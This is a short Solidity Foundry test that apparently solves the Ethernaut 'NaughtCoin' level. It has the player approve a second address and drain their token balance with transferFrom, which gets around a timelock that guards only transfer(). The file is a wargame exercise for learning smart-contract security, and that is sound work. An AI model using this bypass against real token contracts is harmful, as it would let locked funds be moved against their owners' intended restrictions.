// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level15.sol";
import "forge-std/Test.sol";

contract ExploitLevel15 is Test {
    address player = vm.addr(1);
    NaughtCoin instance = new NaughtCoin(player);

    function testExploit() external {
        uint256 initialBalance = instance.balanceOf(player);
        console.log("Player's balance before:", initialBalance);

        vm.prank(player);
        instance.approve(address(this), initialBalance);

        instance.transferFrom(player, address(this), initialBalance);

        console.log("Player's balance after:", instance.balanceOf(player));
    }
}
